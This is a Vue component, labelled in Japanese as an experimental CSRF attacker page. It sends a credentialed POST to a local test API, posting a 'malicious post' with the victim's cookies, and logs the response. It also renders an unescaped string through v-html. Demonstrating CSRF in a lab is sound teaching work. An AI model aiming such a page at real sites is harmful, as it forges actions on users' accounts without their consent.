<template>
  <div class="p-6 font-sans">
    <h1 class="text-2xl mb-4">CSRF 攻撃者ページ（実験用）</h1>

    <div class="flex gap-2 mb-4">
      <button class="px-3 py-2 bg-red-500 rounded" @click="doFetchPost">
        攻撃
      </button>
    </div>

    <div class="mb-4 p-4 border rounded bg-white">
      <h2 class="font-semibold mb-2">送信ログ（ブラウザで確認）</h2>
      <div class="text-sm mt-2">レスポンス / 結果:</div>
      <pre class="bg-gray-50 p-2 rounded text-sm">{{ log.join("\n\n") }}</pre>
    </div>

    <div v-if="imageUrl" class="mt-4">
      <h3 class="font-semibold">生成したimgタグ（挿入先に表示されます）</h3>
      <div v-html="imageUrl"></div>
    </div>
  </div>
</template>

<script setup lang="ts">
import { ref } from "vue";

const log = ref<string[]>([]);
const imageUrl = ref<string>("");

async function doFetchPost() {
  // ログ用に表示
  log.value.unshift(
    `[Fetch POST] ${new Date().toLocaleTimeString()} -> sending...`
  );

  try {
    const resp = await fetch("http://localhost:3001/api/messages", {
      method: "POST",
      credentials: "include", // ここが重要：被害者サイトの Cookie を自動送信させる（CSRF を実演）
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ content: "悪意のある投稿です" }),
    });
    log.value.unshift(
      `[Fetch POST] ${new Date().toLocaleTimeString()} Status: ${resp.status} ${
        resp.statusText
      }`
    );
    // try to read body as text (may be blocked by CORS)
    try {
      const txt = await resp.text();
      log.value.unshift(`[Fetch POST] response body:\n${txt}`);
    } catch (e) {
      log.value.unshift(
        `[Fetch POST] response body: (could not read - CORS / opaque response)`
      );
    }
  } catch (err: any) {
    log.value.unshift(`[Fetch POST] Error: ${String(err)}`);
  }
}
</script>

<style scoped>
/* 簡易スタイル（必要ならお好みで） */
body {
  font-family: ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto,
    "Helvetica Neue", Arial;
}
</style>
